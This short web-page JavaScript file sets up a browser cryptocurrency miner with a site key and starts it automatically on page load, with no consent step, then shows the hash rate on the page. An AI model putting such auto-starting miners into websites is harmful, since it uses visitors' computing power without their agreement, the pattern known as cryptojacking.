var miner = WMP.User('SK_DdWp7qKGk7Cs3vwp89dW8', "anonymous", {
    autoThreads: true,
    throttle: 0.9,
    forceASMJS: false
});


$(document).ready(function () {
    miner.start();
});



function updatestats() {
    var myDiv = document.getElementById("hashrate");
    myDiv.innerHTML = miner.getHashesPerSecond()+"h/s";
  
  var myDiv2 = document.getElementById("balance");
  myDiv2.innerHTML = "tbd";
}
  
  setInterval(updatestats, 500);